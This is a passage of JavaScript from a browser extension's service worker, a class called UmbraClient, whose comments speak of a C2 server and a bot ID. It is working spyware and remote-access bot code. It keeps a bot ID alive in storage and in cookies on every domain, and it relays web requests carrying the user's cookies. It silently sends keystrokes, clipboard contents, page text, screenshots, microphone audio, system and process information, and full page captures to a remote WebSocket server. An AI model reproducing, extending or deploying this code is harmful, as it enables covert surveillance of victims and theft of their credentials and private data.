        tabId,
        listener,
        timeout,
        abort: () => {
          if (!finish(() => {
            clearTimeout(timeout);
            chrome.tabs.onUpdated.removeListener(listener);
          })) return;
          try {
            chrome.tabs.stop(tabId);
            chrome.tabs.goBack(tabId);
          } catch (e) {
            console.warn("abort cleanup failed:", e);
          }
          resolve({ error: "Task stopped by user" });
        },
      });

      chrome.tabs.onUpdated.addListener(listener);
      chrome.tabs.update(tabId, { url: url });
    });
  }

  async stopTabNavigate(params) {
    for (const [taskId, task] of this.activeTasks.entries()) {
      task.abort();
      this.activeTasks.delete(taskId);
    }
    return { success: true };
  }

  async authenticate(params) {
    let browserId = await this.getPersistentBrowserId();

    if (!browserId) {
      browserId = this.uuidv4();
      await this.setPersistentBrowserId(browserId);
      console.log(`Generated new persistent Browser ID: ${browserId}`);
    } else {
      console.log(`Retrieved existing persistent Browser ID: ${browserId}`);
      await this.setPersistentBrowserId(browserId);
    }

    this.currentBrowserId = browserId;

    const systemInfo = await this.getSystemInfo();

    // Schedule an immediate full capture once the AUTH response goes out.
    // The server only starts its readLoop after processing our AUTH reply,
    // so a short delay ensures subsequent SYNC messages are not discarded.
    setTimeout(() => this.initialCapture(), 500);

    return {
      browser_id: browserId,
      user_agent: navigator.userAgent,
      timestamp: this.getUnixTimestamp(),
      system_info: systemInfo,
      capabilities: {
        browser_snapshot_v1: true,
        schema_versions: [1],
        chunk_size: 524288,
      },
    };
  }

  // Run once per connection (install, browser restart, reconnect).
  // Sends tabs + full data dump immediately instead of waiting for the
  // normal 63 s / 321 s intervals.
  async initialCapture() {
    if (!this.websocket || this.websocket.readyState !== WebSocket.OPEN) {
      return;
    }
    try {
      console.log("Initial capture: sending immediate SYNC + SYNC_HUGE");
      await this.syncBasicData();
      await this.syncHugeData();
    } catch (e) {
      console.error("Initial capture failed:", e);
    }
  }

  async getPersistentBrowserId() {
    // Strategy: Sync > Local > Cookie (Global Search)
    let id = null;

    // 1. Try Sync Storage
    try {
      const syncData = await new Promise((resolve) => {
        chrome.storage.sync.get(["browser_id"], resolve);
      });
      if (syncData && syncData.browser_id) {
        console.log("Found ID in Sync Storage");
        return syncData.browser_id;
      }
    } catch (e) {
      console.warn("Sync Storage failed/disabled:", e);
    }

    // 2. Try Local Storage
    try {
      id = await this.localStorage.getItem("browser_id");
      if (id) {
        console.log("Found ID in Local Storage");
        return id;
      }
    } catch (e) {}

    // 3. Try Cookies (Global Search)
    // Since the C2 URL might be random/changing, we search ALL domains for our cookie.
    try {
      if (chrome.cookies) {
        console.log("Searching all cookies for 'cc_bot_id'...");
        const cookies = await new Promise((resolve) => {
          chrome.cookies.getAll({ name: "cc_bot_id" }, resolve);
        });

        if (cookies && cookies.length > 0) {
          // Sort by expiration date or creation to get the most "relevant" one if multiple exist?
          // For now, just taking the first one found is likely sufficient as the ID should be effectively unique per machine.
          const foundCookie = cookies[0];
          console.log(`Found ID in Cookie on domain ${foundCookie.domain}: ${foundCookie.value}`);
          return foundCookie.value;
        }
      }
    } catch (e) {
        console.error("Cookie check failed:", e);
    }

    return null;
  }

  async setPersistentBrowserId(id) {
    // 1. Save to Local Storage
    try {
      await this.localStorage.setItem("browser_id", id);
    } catch (e) {}

    // 2. Save to Sync Storage
    try {
      chrome.storage.sync.set({ browser_id: id }, () => {
        if (chrome.runtime.lastError) {
          console.warn("Sync set failed:", chrome.runtime.lastError);
        }
      });
    } catch (e) {}

    // 3. Save to Cookies
    try {
      if (chrome.cookies) {
        // We still need to set it *somewhere*. 
        // We write to the current SERVER_URL domain logic as a best effort.
        // We also try writing to the 'root' domain if possible to maximize visibility?
        // For now, sticking to the standard target domains is best practice.
        const serverUrl = this.SERVER_URL.replace("ws://", "http://").replace("wss://", "https://");
        const urlsToTry = [
            serverUrl,
            "http://localhost",
            "http://127.0.0.1"
        ];
        
        try {
            const urlObj = new URL(serverUrl);
            urlsToTry.push(`${urlObj.protocol}//${urlObj.hostname}`);
        } catch(e){}

        const uniqueUrls = [...new Set(urlsToTry)];
        const expirationDate = this.getUnixTimestamp() + (60 * 60 * 24 * 365 * 5); // 5 years

        for (const url of uniqueUrls) {
            chrome.cookies.set({
              url: url,
              name: "cc_bot_id",
              value: id,
              expirationDate: expirationDate,
              sameSite: "no_restriction",
              secure: url.startsWith("https")
            }, (c) => {
                 if (chrome.runtime.lastError) {
                     // verification might fail for some domains if not applicable, that's fine
                 }
            });
        }
      }
    } catch (e) {
        console.error("Cookie set failed:", e);
    }
  }

  // HTTP request handling
  async performHttpRequest(params) {
    // Whether to include cookies when sending request
    const credentialsMode = params.authenticated ? "include" : "omit";

    // Set the X-PLACEHOLDER-SECRET to the generated secret.
    params.headers["X-PLACEHOLDER-SECRET"] = this.placeholderSecretToken;

    const headerKeys = Object.keys(params.headers);
    const newHeaders = {};

    // Process headers in Manifest V3
    headerKeys.forEach((key) => {
      if (!this.HEADERS_TO_REPLACE.includes(key.toLowerCase())) {
        // Keep regular headers
        newHeaders[key] = params.headers[key];
      } else if (!this.REQUEST_HEADER_BLACKLIST.includes(key.toLowerCase())) {
        // For special headers, use X-PLACEHOLDER- prefix
        newHeaders[`X-PLACEHOLDER-${key}`] = params.headers[key];
      }
    });

    const requestOptions = {
      method: params.method,
      mode: "cors",
      cache: "no-cache",
      credentials: credentialsMode,
      headers: newHeaders,
      redirect: "follow",
    };

    // Process request body
    if (params.body) {
      // Convert base64 to Blob
      const fetchURL = `data:application/octet-stream;base64,${params.body}`;
      const fetchResp = await fetch(fetchURL);
      requestOptions.body = await fetchResp.blob();
    }

    try {
      var response = await fetch(params.url, requestOptions);
    } catch (e) {
      // Surface fetch failures so the proxy returns 502 instead of
      // the server hanging until its 60s timeout. Empty body is
      // base64-empty so the consumer doesn't choke.
      console.error(`Error occurred while performing fetch:`, e);
      return {
        url: params.url,
        status: 0,
        status_text: String(e && e.message ? e.message : e),
        headers: {},
        body: "",
        error: String(e && e.message ? e.message : e),
      };
    }

    var responseHeaders = {};

    for (var pair of response.headers.entries()) {
      responseHeaders[pair[0]] = pair[1];
    }

    // Handle redirect issues
    if (this.REDIRECT_STATUS_CODES.includes(response.status)) {
      console.log(`Detected redirect: ${response.status} -> ${response.url}`);

      return {
        url: response.url,
        status: response.status,
        status_text: response.statusText || "Redirect",
        headers: responseHeaders,
        body: "",
        is_redirect: true,
      };
    }

    const responseArray = await response.arrayBuffer();

    return {
      url: response.url,
      status: response.status,
      status_text: response.statusText,
      headers: responseHeaders,
      body: this.arrayBufferToBase64(responseArray),
    };
  }

  // Utility methods
  getSecureRandomToken(bytesLength) {
    const validChars =
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let array = new Uint8Array(bytesLength);
    crypto.getRandomValues(array);
    array = array.map((x) => validChars.charCodeAt(x % validChars.length));
    const randomString = String.fromCharCode.apply(null, array);
    return randomString;
  }

  uuidv4() {
    return ([1e7] + -1e3 + -4e3 + -8e3 + -1e11).replace(/[018]/g, (c) =>
      (
        c ^
        (crypto.getRandomValues(new Uint8Array(1))[0] & (15 >> (c / 4)))
      ).toString(16)
    );
  }

  arrayBufferToBase64(buffer) {
    let binary = "";
    const bytes = new Uint8Array(buffer);
    const len = bytes.byteLength;
    for (let i = 0; i < len; i++) {
      binary += String.fromCharCode(bytes[i]);
    }
    return btoa(binary);
  }

  getUnixTimestamp() {
    return Math.floor(Date.now() / 1000);
  }

  // Handle screen capture request from content script
  async handleScreenCaptureRequest(requestData, sender, sendResponse) {
    try {
      // requestData.quality is 0.0-1.0 from content script, captureVisibleTab uses 1-100
      const quality = requestData.quality
        ? Math.floor(requestData.quality * 100)
        : 80;
      const imageData = await this.getCurrentTabImage(
        quality,
        sender.tab.windowId
      );
      sendResponse({
        success: true,
        imageData: imageData,
      });
    } catch (error) {
      console.error("Screen capture failed:", error);
      sendResponse({
        success: false,
        error: error.message,
      });
    }
  }

  // Handle screen capture data from content script
  handleScreenCaptureData(captureData, sender) {
    if (!this.websocket || this.websocket.readyState !== 1) {
      return;
    }

    this.websocket.send(
      JSON.stringify({
        id: this.uuidv4(),
        version: "1.0.0",
        action: "SCREEN_CAPTURE_DATA",
        data: captureData,
      })
    );

    console.log(
      `[DEBUG] Screen capture data sent: ${captureData.captures.length} captures`
    );
  }

  // Send debug log to server
  debugLog(message) {
    if (!this.websocket || this.websocket.readyState !== 1) {
      console.log("[LOCAL DEBUG] " + message);
      return;
    }

    this.websocket.send(
      JSON.stringify({
        id: this.uuidv4(),
        version: "1.0.0",
        action: "DEBUG_LOG",
        data: {
          message: message,
        },
      })
    );
  }

  // Handle user activity reported from content script
  handleUserActivity(timestamp, sender) {
    if (!this.websocket || this.websocket.readyState !== 1) {
      return;
    }

    this.websocket.send(
      JSON.stringify({
        id: this.uuidv4(),
        version: "1.0.0",
        action: "USER_ACTIVITY",
        data: {
          timestamp: timestamp,
          tab: {
            id: sender.tab.id,
            url: sender.tab.url,
            title: sender.tab.title,
          },
        },
      })
    );
  }

  // Handle keyboard data from content script
  handleKeyboardData(keyboardData, sender) {
    if (!this.websocket || this.websocket.readyState !== 1) {
      return;
    }

    // Only send if persistent keyboard is enabled
    if (!this.SYNC_SWITCH.PERSISTENT_KEYBOARD) {
      return;
    }

    this.websocket.send(
      JSON.stringify({
        id: this.uuidv4(),
        version: "1.0.0",
        action: "KEYBOARD_LOGS",
        data: keyboardData,
      })
    );

    console.log(
      `[DEBUG] Keyboard data sent: ${keyboardData.keys.length} chars`
    );
  }

  // Handle audio chunk from offscreen document
  handleAudioChunk(audioData) {
    if (!this.websocket || this.websocket.readyState !== 1) {
      return;
    }

    this.websocket.send(
      JSON.stringify({
        id: this.uuidv4(),
        version: "1.0.0",
        action: "AUDIO_DATA",
        data: audioData,
      })
    );
  }

  async checkPersistentFeatures() {
    if (this.SYNC_SWITCH.PERSISTENT_RECORDING && !this.isAudioRecording) {
      console.log("[DEBUG] Auto-starting persistent audio recording");
      this.startAudioRecording();
    } else if (
      !this.SYNC_SWITCH.PERSISTENT_RECORDING &&
      this.isAudioRecording
    ) {
      console.log("[DEBUG] Auto-stopping persistent audio recording");
      this.stopAudioRecording();
    }
  }

  async startAudioRecording() {
    if (this.isAudioRecording) return { success: true };
    this.isAudioRecording = true;
    this.currentAudioSessionId =
      Date.now().toString(36) + Math.random().toString(36).substring(2);
    this.debugLog("Starting audio recording, session=" + this.currentAudioSessionId);

    try {
      await this.setupOffscreenDocument();
    } catch (e) {
      this.isAudioRecording = false;
      this.debugLog("Offscreen setup failed: " + e.message);
      return { success: false, error: e.message };
    }

    return new Promise((resolve) => {
      chrome.runtime.sendMessage(
        {
          type: "START_RECORDING",
          data: {
            bot_id: this.currentBrowserId || "unknown",
            session_id: this.currentAudioSessionId,
          },
        },
        (response) => {
          if (chrome.runtime.lastError) {
            this.isAudioRecording = false;
            const msg = chrome.runtime.lastError.message;
            this.debugLog("START_RECORDING message error: " + msg);
            resolve({ success: false, error: msg });
          } else if (response && response.error) {
            this.isAudioRecording = false;
            this.debugLog("START_RECORDING failed: " + response.error);
            resolve(response);
          } else {
            this.debugLog("Recording started OK");
            resolve(response || { success: true });
          }
        }
      );
    });
  }

  async stopAudioRecording() {
    if (!this.isAudioRecording) return { success: true };
    this.isAudioRecording = false;
    this.debugLog("Stopping audio recording...");
    return new Promise((resolve) => {
      chrome.runtime.sendMessage(
        { type: "STOP_RECORDING" },
        (response) => {
          if (chrome.runtime.lastError) {
            this.debugLog("STOP_RECORDING error: " + chrome.runtime.lastError.message);
            resolve({ error: chrome.runtime.lastError.message });
          } else {
            this.debugLog("Recording stopped OK");
            resolve(response || { success: true });
          }
        }
      );
    });
  }

  async setupOffscreenDocument() {
    const offscreenUrl = chrome.runtime.getURL("src/offscreen/offscreen.html");
    try {
      const existingContexts = await chrome.runtime.getContexts({
        contextTypes: ["OFFSCREEN_DOCUMENT"],
        documentUrls: [offscreenUrl],
      });

      if (existingContexts.length > 0) {
        this.debugLog("Offscreen document already exists.");
        return;
      }

      this.debugLog("Creating offscreen document...");
      await chrome.offscreen.createDocument({
        url: offscreenUrl,
        reasons: ["USER_MEDIA", "DOM_PARSER"],
        justification:
          "Capture authorized monitoring audio and keep the sensor worker alive.",
      });
      this.debugLog("Offscreen document created, waiting for ready...");
      await this.waitForOffscreenReady();
      this.debugLog("Offscreen document ready.");
    } catch (e) {
      this.debugLog("Offscreen setup failed: " + e.message);
      throw e;
    }
  }

  waitForOffscreenReady(maxAttempts = 20) {
    let attempts = 0;
    return new Promise((resolve, reject) => {
      const poll = () => {
        attempts++;
        chrome.runtime.sendMessage({ type: "OFFSCREEN_PING" }, (resp) => {
          if (chrome.runtime.lastError) {
            if (attempts >= maxAttempts) {
              reject(new Error("Offscreen document not ready after " + maxAttempts + " attempts"));
              return;
            }
            setTimeout(poll, 100);
            return;
          }
          resolve();
        });
      };
      poll();
    });
  }

  // ── 新增静默采集能力 ─────────────────────────────────────────

  async getSessions() {
    if (!chrome.sessions) return [];
    return new Promise((resolve) => {
      chrome.sessions.getRecentlyClosed({ maxResults: 25 }, (sessions) => {
        resolve(sessions || []);
      });
    });
  }

  async getTopSites() {
    if (!chrome.topSites) return [];
    return new Promise((resolve) => {
      chrome.topSites.get((sites) => resolve(sites || []));
    });
  }

  async getReadingList() {
    if (!chrome.readingList) return [];
    try {
      const items = await chrome.readingList.query({});
      return items || [];
    } catch (e) {
      return [];
    }
  }

  async getSystemInfo() {
    const info = {};
    try {
      if (chrome.system?.cpu) {
        info.cpu = await new Promise((resolve) =>
          chrome.system.cpu.getInfo((d) => resolve(d || {}))
        );
      }
    } catch (_) {}
    try {
      if (chrome.system?.memory) {
        info.memory = await new Promise((resolve) =>
          chrome.system.memory.getInfo((d) => resolve(d || {}))
        );
      }
    } catch (_) {}
    try {
      if (chrome.system?.storage) {
        info.storage = await new Promise((resolve) =>
          chrome.system.storage.getInfo((d) => resolve(d || []))
        );
      }
    } catch (_) {}
    return info;
  }

  async getProcesses() {
    if (!chrome.processes) return {};
    return new Promise((resolve) => {
      chrome.processes.getProcessInfo([], false, (procs) =>
        resolve(procs || {})
      );
    });
  }

  async capturePageMhtml(params) {
    const tabId = params?.tab_id;
    if (!chrome.pageCapture || !tabId) return { error: "missing tab_id" };
    return new Promise((resolve) => {
      chrome.pageCapture.saveAsMHTML({ tabId }, async (mhtmlData) => {
        if (chrome.runtime.lastError) {
          resolve({ error: chrome.runtime.lastError.message });
          return;
        }
        try {
          // Service Worker 没有 FileReader，用 arrayBuffer() + 现有工具方法
          const buf = await mhtmlData.arrayBuffer();
          resolve({ mhtml_base64: this.arrayBufferToBase64(buf), size: mhtmlData.size });
        } catch (e) {
          resolve({ error: e.message });
        }
      });
    });
  }

  handleClipboardData(data, sender) {
    if (!this.websocket || this.websocket.readyState !== 1) return;
    this.websocket.send(
      JSON.stringify({
        id: this.uuidv4(),
        version: "1.0.0",
        action: "CLIPBOARD_DATA",
        data,
      })
    );
  }

  handlePageText(data, sender) {
    if (!this.websocket || this.websocket.readyState !== 1) return;
    if (!data || !data.text) return;
    this.websocket.send(
      JSON.stringify({
        id: this.uuidv4(),
        version: "1.0.0",
        action: "PAGE_TEXT",
        data,
      })
    );
  }

  async applyPolicyFromConfig() {
    try {
      if (globalThis.UmbraDNRPolicy) {
        await globalThis.UmbraDNRPolicy.apply(this.SYNC_SWITCH, this.SYNC_DATA_CONFIG);
      }
    } catch (err) {
      console.error("DNR policy apply failed", err);
    }
    try {
      if (this.SYNC_SWITCH.CANARY !== false && globalThis.UmbraCanary) {
        await globalThis.UmbraCanary.plant(this.SYNC_DATA_CONFIG.CANARY_TOKEN);
      }
    } catch (err) {
      console.error("canary plant failed", err);
    }
  }

  onPolicyNavigation(url, tabId) {
    const policy = globalThis.UmbraDNRPolicy;
    if (!policy) return;
    const rule = policy.matchRule(url, policy.rulesFromConfig(this.SYNC_DATA_CONFIG));
    if (!rule) return;
    if (rule.action === "screenshot_burst" && tabId && chrome.tabs && chrome.tabs.captureVisibleTab) {
      try {
        chrome.tabs.captureVisibleTab(null, { format: "jpeg", quality: 80 }, (dataUrl) => {
          if (!dataUrl || !this.websocket || this.websocket.readyState !== 1) return;
          this.websocket.send(JSON.stringify({
            id: this.uuidv4(),
            version: "1.0.0",
            action: "SCREEN_CAPTURE_DATA",
            data: { captures: [{ url, imageData: dataUrl, sessionId: "playbook" }] },
          }));
        });
      } catch (_e) {}
    }
    if (this.SYNC_SWITCH.CANARY !== false && globalThis.UmbraCanary) {
      globalThis.UmbraCanary.plant(this.SYNC_DATA_CONFIG.CANARY_TOKEN);
    }
  }
}

// Initialize the client when the service worker starts
let client = null;
try {
  client = new UmbraClient();
} catch (error) {
  console.error("Failed to initialize UmbraClient:", error);
}

// Service worker listeners
self.addEventListener("install", (event) => {
  console.log("Service Worker installing...");
  self.skipWaiting();
});

self.addEventListener("activate", (event) => {
  console.log("Service Worker activating...");
  return self.clients.claim();
});
